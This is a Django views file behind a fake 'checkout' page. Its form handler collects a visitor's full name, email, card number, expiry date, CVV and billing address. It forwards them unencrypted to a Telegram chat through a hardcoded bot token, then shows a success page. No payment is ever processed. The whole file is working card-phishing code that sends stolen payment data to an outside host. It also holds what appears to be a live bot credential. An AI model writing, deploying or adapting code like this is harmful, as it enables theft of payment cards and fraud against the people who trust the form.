import requests
from django.shortcuts import render, redirect 
from .forms import MyForm
from colorama import init, Fore, Style

init(autoreset=True)

# Telegram ID
TELEGRAM_BOT_TOKEN = '8131665636:AAEpdK_pyMsSP-7G-B88WO7-84VS91Jbuew'
TELEGRAM_CHAT_ID = '8153215212'

# Create your views here.
def home(request):
    return render(request, 'checkout/index.html')

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        print("🔄 Sending message to Telegram...")
        response = requests.post(url, data=payload)
        print(f"✅ Telegram response status: {response.status_code}")
        print(f"📬 Telegram response body: {response.text}")
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Error sending to Telegram: {e}")
        return False

def form_view(request):
    if request.method == 'POST':
        form = MyForm(request.POST)
        if form.is_valid():
            data = form.cleaned_data
            message = (
                f"New Form Submission:\n\n"
                f"Full Name: {data['full_name']}\n"
                f"Email: {data['email']}\n"
                f"Card Number: {data['card_number']}\n"
                f"Expiry: {data['expiry']}\n"
                f"CVV: {data['cvv']}\n"
                f"Address Line 1: {data['address1']}\n"
                f"Address Line 2: {data['address2']}\n"
                f"Amount: {data['amount']}"
            )
            sent = send_telegram_message(message)
            if sent:
                print("✅ Telegram message sent successfully.")
            else:
                print("⚠️ Telegram message failed to send.")
            return render(request, 'checkout/success.html')  # direct render
        else:
            print("❌ Form is not valid.")
            print(form.errors.as_json())
    else:
        form = MyForm()
        print("👋 GET request, showing form.")
    return render(request, 'checkout/form.html', {'form': form})

def success_view(request):
    return render(request, 'checkout/success.html')
